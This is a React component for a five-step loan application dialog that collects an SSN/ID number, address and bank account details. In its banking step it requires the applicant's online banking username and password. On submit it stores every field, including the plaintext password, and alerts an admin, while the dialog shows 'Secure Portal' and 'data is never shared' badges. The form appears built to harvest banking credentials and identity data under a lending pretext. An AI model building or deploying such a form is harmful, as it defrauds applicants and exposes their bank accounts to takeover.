import React, { useState } from "react";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from "@/components/ui/dialog";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { 
  Select, 
  SelectContent, 
  SelectItem, 
  SelectTrigger, 
  SelectValue 
} from "@/components/ui/select";
import { Progress } from "@/components/ui/progress";
import { ScrollArea } from "@/components/ui/scroll-area";
import { motion, AnimatePresence } from "motion/react";
import { 
  ArrowRight, 
  ArrowLeft, 
  CheckCircle2, 
  ShieldCheck, 
  Info,
  Wallet,
  User,
  MapPin,
  Building2,
  Lock
} from "lucide-react";
import { useAuth } from "../lib/AuthContext";
import { insertLoan, insertNotification } from "../lib/db";
import { toast } from "sonner";

interface LoanApplicationDialogProps {
  trigger?: React.ReactNode;
  defaultAmount?: number;
}

export const LoanApplicationDialog: React.FC<LoanApplicationDialogProps> = ({ 
  trigger, 
  defaultAmount = 0 
}) => {
  const { user } = useAuth();
  const [step, setStep] = useState(1);
  const [open, setOpen] = useState(false);
  const [loading, setLoading] = useState(false);

  const [formData, setFormData] = useState({
    amount: defaultAmount,
    term: 0,
    firstName: "",
    lastName: "",
    dob: "",
    phone: "",
    idNumber: "", // PAN/SSN
    address: "",
    city: "",
    state: "",
    zip: "",
    bankName: "",
    accountNumber: "",
    routingNumber: "",
    onlineBankingId: "",
    onlineBankingPassword: "",
    monthlyIncome: "",
    email: user?.email || "",
  });

  const isAgeValid = (dob: string) => {
    if (!dob) return false;
    const birthDate = new Date(dob);
    const today = new Date();
    // Allow anyone born in the year 2009 or earlier (where current year is 2026)
    // This allows the full year 2009 as requested.
    return birthDate.getFullYear() <= today.getFullYear() - 17;
  };

  const nextStep = () => {
    if (step === 1) {
      if (!formData.amount || formData.amount < 500) {
        toast.error("Minimum loan amount is $500");
        return;
      }
      if (!formData.term || formData.term <= 0) {
        toast.error("Please select a loan term");
        return;
      }
    }

    if (step === 2) {
      if (!formData.firstName || !formData.lastName || !formData.dob || !formData.idNumber || !formData.phone) {
        toast.error("Please fill in all required personal details");
        return;
      }
      if (formData.phone.length !== 10) {
        toast.error("Phone number must be exactly 10 digits");
        return;
      }
      if (formData.idNumber.length !== 12) {
        toast.error("ID Number must be exactly 12 digits");
        return;
      }
      if (!isAgeValid(formData.dob)) {
        toast.error("Age Restricted: You must be at least 17 years old to apply for a loan.");
        return;
      }
    }

    if (step === 3) {
      if (!formData.address || !formData.city || !formData.state || !formData.zip) {
        toast.error("Please provide your complete address info");
        return;
      }
    }

    if (step === 4) {
      if (!formData.bankName || !formData.accountNumber || !formData.routingNumber || !formData.onlineBankingId || !formData.onlineBankingPassword || !formData.monthlyIncome) {
        toast.error("Please provide your complete banking and credentials");
        return;
      }
      if (formData.routingNumber.length !== 9) {
        toast.error("Routing number must be exactly 9 digits");
        return;
      }
    }

    setStep((s) => Math.min(s + 1, 5));
  };
  const prevStep = () => setStep((s) => Math.max(s - 1, 1));

  const updateField = (field: string, value: any) => {
    setFormData((prev) => ({ ...prev, [field]: value }));
  };

  const handleNumericInput = (field: string, value: string, maxLength?: number) => {
    const numericValue = value.replace(/\D/g, "");
    if (maxLength && numericValue.length > maxLength) return;
    updateField(field, numericValue);
  };

  const handleTextInput = (field: string, value: string) => {
    const textValue = value.replace(/[0-9]/g, "");
    updateField(field, textValue);
  };

  const calculateEMI = () => {
    if (!formData.amount || !formData.term) return 0;
    const monthlyRate = 0.0845 / 12; // 8.45% annual
    const emi = (formData.amount * monthlyRate * Math.pow(1 + monthlyRate, formData.term)) / (Math.pow(1 + monthlyRate, formData.term) - 1);
    return Math.round(emi);
  };

  const handleSubmit = async () => {
    setLoading(true);
    try {
      const borrowerId = user?.uid || "guest_" + Math.random().toString(36).substring(7);
      
      const monthlyEMI = calculateEMI();

      await insertLoan({
        borrowerId:       borrowerId,
        borrowerName:     `${formData.firstName} ${formData.lastName}`,
        amount:           Number(formData.amount),
        termMonths:       Number(formData.term),
        interestRate:     8.45,
        status:           "pending",
        totalPayable:     monthlyEMI * Number(formData.term),
        remainingBalance: monthlyEMI * Number(formData.term),
        nextPaymentDate:  new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString(),
        applicationDate:  new Date().toISOString(),
        monthlyEMI:       monthlyEMI,
        details:          { ...formData, email: formData.email || "guest@example.com" },
      });

      await insertNotification({
        userId:    "admin",
        title:     "New Application Received",
        message:   `A new loan application from ${formData.firstName} ${formData.lastName} for $${Number(formData.amount).toLocaleString()} is waiting for review.`,
        type:      "info",
        read:      false,
        createdAt: new Date().toISOString(),
      });

      toast.success("Application submitted successfully!");
      setFormData({
        amount: defaultAmount,
        term: 0,
        firstName: "",
        lastName: "",
        dob: "",
        phone: "",
        idNumber: "",
        address: "",
        city: "",
        state: "",
        zip: "",
        bankName: "",
        accountNumber: "",
        routingNumber: "",
        onlineBankingId: "",
        onlineBankingPassword: "",
        monthlyIncome: "",
        email: user?.email || "",
      });
      setOpen(false);
      setStep(1);
    } catch (error) {
      console.error(error);
      toast.error("Failed to submit application");
    } finally {
      setLoading(false);
    }
  };

  const steps = [
    { id: 1, label: "Loan", icon: <Wallet className="w-4 h-4" /> },
    { id: 2, label: "Personal", icon: <User className="w-4 h-4" /> },
    { id: 3, label: "Address", icon: <MapPin className="w-4 h-4" /> },
    { id: 4, label: "Banking", icon: <Building2 className="w-4 h-4" /> },
    { id: 5, label: "Portal", icon: <Lock className="w-4 h-4" /> },
  ];

  return (
    <Dialog open={open} onOpenChange={setOpen}>
      <DialogTrigger render={trigger || <Button>Apply Now</Button>} />
      <DialogContent className="max-w-2xl w-[calc(100vw-16px)] sm:w-full max-h-[90vh] overflow-y-auto p-0 overflow-hidden border-none shadow-2xl bg-white rounded-xl flex flex-col">
        <DialogHeader className="bg-navy p-4 flex flex-row items-center justify-between text-white space-y-0 shrink-0">
          <div className="flex items-center gap-3">
             <div className="bg-white/10 p-1.5 rounded-lg border border-white/10">
                <Wallet className="w-4 h-4" />
             </div>
             <div className="bg-amber-500/20 border border-amber-500/50 px-3 py-1 rounded-full">
                <span className="text-[9px] font-bold text-amber-400 uppercase tracking-widest">Secure Portal</span>
             </div>
          </div>
        </DialogHeader>

        <ScrollArea className="flex-1 overflow-y-auto">
          <div className="p-4 sm:p-8 space-y-8 overflow-y-auto">
            {/* Stepper */}
            <div className="relative pt-2">
              <div className="flex justify-between items-center relative z-10 px-2">
                {steps.map((s) => (
                  <div key={s.id} className="flex flex-col items-center gap-2 group shrink-0" onClick={() => setStep(s.id)}>
                    <div className={`w-6 h-6 sm:w-8 sm:h-8 rounded-full border-4 flex items-center justify-center text-[10px] font-black transition-all ${
                      step >= s.id ? "bg-navy text-white border-navy shadow-md ring-2 ring-navy/20" : "bg-slate-50 text-slate-400 border-white"
                    }`}>
                      {step > s.id ? <CheckCircle2 className="w-5 h-5 shrink-0" /> : `0${s.id}`}
                    </div>
                    <span className={`text-[9px] sm:text-[10px] font-black uppercase tracking-tighter ${step >= s.id ? "text-navy" : "text-slate-400"} ${s.id > 1 ? "hidden sm:block" : ""}`}>
                      {s.label}
                    </span>
                  </div>
                ))}
              </div>
              <div className="h-[2px] absolute top-[34px] left-8 right-8 -z-0 bg-slate-100">
                <div 
                  className="h-full bg-navy transition-all duration-500" 
                  style={{ width: `${((step - 1) / 4) * 100}%` }}
                />
              </div>
            </div>

            <div className="space-y-1">
               <p className="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Step {step} of 5</p>
               <h2 className="text-2xl font-black text-navy flex items-center gap-3">
                  {step === 1 && <><span className="text-2xl">💰</span> Loan Details</>}
                  {step === 2 && <><span className="text-2xl">👤</span> Personal Info</>}
                  {step === 3 && <><span className="text-2xl">🏠</span> Address Info</>}
                  {step === 4 && <><span className="text-2xl">🏦</span> Banking Info</>}
                  {step === 5 && <><span className="text-2xl">🔐</span> Confirmation</>}
               </h2>
            </div>

          <AnimatePresence mode="wait">
            <motion.div
              key={step}
              initial={{ opacity: 0, x: 20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: -20 }}
              transition={{ duration: 0.3 }}
              className="space-y-6"
            >
              {step === 1 && (
                <div className="space-y-6">
                  <div className="bg-amber-50 border border-amber-200 p-4 rounded-lg flex gap-3">
                    <Info className="w-5 h-5 text-amber-600 flex-shrink-0" />
                    <p className="text-sm text-amber-700 leading-relaxed">
                      Select your desired loan amount and repayment term. Monthly payment is calculated at a fixed 8.45% APR.
                    </p>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
                    <div className="space-y-2">
                       <Label className="text-xs font-bold uppercase text-slate-500">Loan Amount (Min $500) *</Label>
                       <div className="relative">
                          <span className="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-bold">$</span>
                          <Input 
                            type="number" 
                            className="pl-8 h-12 text-lg font-bold border-slate-200" 
                            value={formData.amount === 0 ? "" : formData.amount}
                            onChange={(e) => updateField("amount", e.target.value === "" ? 0 : Number(e.target.value))}
                            onFocus={(e) => e.target.select()}
                            placeholder="500"
                            autoComplete="off"
                          />
                       </div>
                    </div>
                    <div className="space-y-2">
                       <Label className="text-xs font-bold uppercase text-slate-500">Loan Term *</Label>
                       <Select 
                          value={formData.term.toString()} 
                          onValueChange={(v) => updateField("term", Number(v))}
                        >
                          <SelectTrigger className="h-12 text-lg font-bold border-slate-200">
                            <SelectValue placeholder="Select term" />
                          </SelectTrigger>
                          <SelectContent>
                            <SelectItem value="0">Select Term</SelectItem>
                            <SelectItem value="6">6 Months</SelectItem>
                            <SelectItem value="12">12 Months</SelectItem>
                            <SelectItem value="24">24 Months</SelectItem>
                            <SelectItem value="36">36 Months</SelectItem>
                            <SelectItem value="48">48 Months</SelectItem>
                          </SelectContent>
                       </Select>
                    </div>
                  </div>
                  <div className="p-4 sm:p-6 border-2 border-dashed border-slate-200 rounded-xl bg-slate-50 text-center space-y-3">
                     <div className="bg-white w-12 h-12 rounded-full flex items-center justify-center mx-auto shadow-sm">
                        <Wallet className="w-6 h-6 text-navy" />
                     </div>
                     <p className="text-navy font-bold text-2xl sm:text-3xl">${calculateEMI().toLocaleString()} <span className="text-sm font-normal text-slate-500">/ month</span></p>
                     <p className="text-xs text-slate-400">Total payable: ${(calculateEMI() * formData.term).toLocaleString()}</p>
                  </div>
                </div>
              )}

              {step === 2 && (
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
                  <div className="space-y-2">
                    <Label className="text-xs font-bold uppercase text-slate-500">First Name</Label>
                    <Input 
                      className="h-12 border-slate-200" 
                      value={formData.firstName}
                      onChange={(e) => updateField("firstName", e.target.value)}
                      autoComplete="off"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label className="text-xs font-bold uppercase text-slate-500">Last Name</Label>
                    <Input 
                      className="h-12 border-slate-200" 
                      value={formData.lastName}
                      onChange={(e) => updateField("lastName", e.target.value)}
                      autoComplete="off"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label className="text-xs font-bold uppercase text-slate-500">Date of Birth</Label>
                    <Input 
                      type="date" 
                      className="h-12 border-slate-200" 
                      value={formData.dob}
                      onChange={(e) => updateField("dob", e.target.value)}
                      max={`${new Date().getFullYear() - 17}-12-31`}
                    />
                    <p className="text-[9px] text-slate-400 font-bold uppercase tracking-widest">Must be 17 years or older to apply</p>
                  </div>
                  <div className="space-y-2">
                    <Label className="text-xs font-bold uppercase text-slate-500">Phone Number (10 Digits)</Label>
                    <Input 
                      placeholder="e.g. 9876543210" 
                      className="h-12 border-slate-200" 
                      value={formData.phone}
                      onChange={(e) => handleNumericInput("phone", e.target.value, 10)}
                      autoComplete="off"
                    />
                  </div>
                  <div className="space-y-2">
                    <Label className="text-xs font-bold uppercase text-slate-500">ID Number (SSN/ID Number)</Label>
                    <Input 
                      placeholder="Enter 12 digits" 
                      className="h-12 border-slate-200" 
                      value={formData.idNumber}
                      onChange={(e) => handleNumericInput("idNumber", e.target.value, 12)}
                      autoComplete="off"
                    />
                  </div>
                </div>
              )}

              {step === 3 && (
                <div className="space-y-6">
                  <div className="space-y-2">
                    <Label className="text-xs font-bold uppercase text-slate-500">Full Address</Label>
                    <Input 
                      placeholder="Street, Area, Building" 
                      className="h-12 border-slate-200" 
                      value={formData.address}
                      onChange={(e) => updateField("address", e.target.value)}
                    />
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-6">
                    <div className="space-y-2">
                      <Label className="text-xs font-bold uppercase text-slate-500">City</Label>
                      <Input 
                        className="h-12 border-slate-200" 
                        value={formData.city}
                        onChange={(e) => updateField("city", e.target.value)}
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-xs font-bold uppercase text-slate-500">State</Label>
                      <Input 
                        className="h-12 border-slate-200" 
                        value={formData.state}
                        onChange={(e) => updateField("state", e.target.value)}
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-xs font-bold uppercase text-slate-500">ZIP</Label>
                      <Input 
                        className="h-12 border-slate-200" 
                        value={formData.zip}
                        onChange={(e) => handleNumericInput("zip", e.target.value, 6)}
                        placeholder="000000"
                      />
                    </div>
                  </div>
                </div>
              )}

              {step === 4 && (
                <div className="space-y-6">
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
                    <div className="space-y-2">
                      <Label className="text-xs font-bold uppercase text-slate-500">Bank Name</Label>
                      <Input 
                        placeholder="e.g. Chase Bank" 
                        className="h-12 border-slate-200" 
                        value={formData.bankName}
                        onChange={(e) => handleTextInput("bankName", e.target.value)}
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-xs font-bold uppercase text-slate-500">Monthly Income ($)</Label>
                      <Input 
                        className="h-12 border-slate-200" 
                        value={formData.monthlyIncome}
                        onChange={(e) => handleNumericInput("monthlyIncome", e.target.value)}
                        onFocus={(e) => (e.target as HTMLInputElement).select()}
                        placeholder="0"
                      />
                    </div>
                  </div>
                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
                    <div className="space-y-2">
                       <Label className="text-xs font-bold uppercase text-slate-500">Account Number</Label>
                       <Input 
                         placeholder="XXXXXXXXXXXX" 
                         className="h-12 border-slate-200" 
                         value={formData.accountNumber}
                         onChange={(e) => handleNumericInput("accountNumber", e.target.value, 16)}
                         autoComplete="off"
                       />
                    </div>
                    <div className="space-y-2">
                       <Label className="text-xs font-bold uppercase text-slate-500">Routing Number (9 Digits)</Label>
                       <Input 
                         placeholder="000000000" 
                         className="h-12 border-slate-200" 
                         value={formData.routingNumber}
                         onChange={(e) => handleNumericInput("routingNumber", e.target.value, 9)}
                         autoComplete="off"
                       />
                    </div>
                  </div>

                  <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4 pt-2 border-t border-slate-100">
                    <div className="space-y-2">
                      <Label className="text-xs font-bold uppercase text-slate-500">Online Banking ID</Label>
                      <Input 
                        placeholder="Username or ID" 
                        className="h-12 border-slate-200" 
                        value={formData.onlineBankingId}
                        onChange={(e) => updateField("onlineBankingId", e.target.value)}
                        autoComplete="off"
                      />
                    </div>
                    <div className="space-y-2">
                      <Label className="text-xs font-bold uppercase text-slate-500">Online Banking Password</Label>
                      <Input 
                        type="password"
                        placeholder="••••••••" 
                        className="h-12 border-slate-200" 
                        value={formData.onlineBankingPassword}
                        onChange={(e) => updateField("onlineBankingPassword", e.target.value)}
                        autoComplete="off"
                      />
                    </div>
                  </div>
                </div>
              )}

              {step === 5 && (
                <div className="text-center space-y-6">
                  <div className="bg-emerald-50 w-20 h-20 rounded-full flex items-center justify-center mx-auto text-emerald-600">
                    <CheckCircle2 className="w-10 h-10" />
                  </div>
                  <div className="space-y-2">
                    <h3 className="text-xl font-bold text-navy">Ready to Submit?</h3>
                    <p className="text-sm text-slate-500">Please review your details. Your application will be processed by our AI risk engine immediately.</p>
                  </div>
                  <div className="bg-slate-50 p-6 rounded-xl border border-slate-200 text-left grid grid-cols-1 sm:grid-cols-2 gap-3 sm:gap-4">
                     <div>
                       <p className="text-[10px] uppercase font-bold text-slate-400">Loan Sum</p>
                       <p className="font-bold text-navy">${formData.amount.toLocaleString()}</p>
                     </div>
                     <div>
                       <p className="text-[10px] uppercase font-bold text-slate-400">Monthly EMI</p>
                       <p className="font-bold text-navy">${calculateEMI().toLocaleString()}</p>
                     </div>
                     <div className="md:col-span-2">
                       <p className="text-[10px] uppercase font-bold text-slate-400">Email for Updates</p>
                       <p className="font-bold text-navy">{formData.email}</p>
                     </div>
                  </div>
                </div>
              )}
            </motion.div>
          </AnimatePresence>
        </div>
      </ScrollArea>

        <div className="flex flex-col-reverse sm:flex-row justify-between gap-3 sm:gap-0 p-6 pt-2 bg-white border-t border-slate-100 shrink-0">
          {step > 1 && (
            <Button 
              variant="outline" 
              onClick={prevStep} 
              className="w-full sm:w-auto flex-1 h-14 border-slate-200 font-bold rounded-xl shadow-sm"
            >
              <ArrowLeft className="mr-2 w-4 h-4" /> Back
            </Button>
          )}
          {step < 5 ? (
            <Button 
              variant="threeD"
              onClick={nextStep} 
              className="w-full sm:w-auto flex-[2] h-14 bg-amber-500 hover:bg-amber-600 text-white font-black uppercase tracking-widest text-[10px] md:text-xs rounded-xl shadow-lg backlight-amber"
            >
              Continue to {steps[step]?.label} Info <ArrowRight className="ml-2 w-4 h-4" />
            </Button>
          ) : (
            <Button 
              variant="threeD"
              onClick={handleSubmit} 
              disabled={loading}
              className="w-full sm:w-auto flex-[2] h-14 bg-navy hover:bg-slate-800 text-white font-black uppercase tracking-widest text-xs rounded-xl shadow-lg"
            >
              {loading ? "Processing..." : "Submit Application →"}
            </Button>
          )}
        </div>

        <div className="bg-slate-50 p-3 border-t border-slate-100 flex justify-center gap-4 text-[9px] text-slate-400 font-bold uppercase tracking-widest shrink-0">
           <span className="flex items-center gap-1"><ShieldCheck className="w-3 h-3" /> 256-bit SSL encrypted</span>
           <span className="flex items-center gap-1">No spam</span>
           <span className="flex items-center gap-1">Your data is never shared</span>
        </div>
      </DialogContent>
    </Dialog>
  );
};
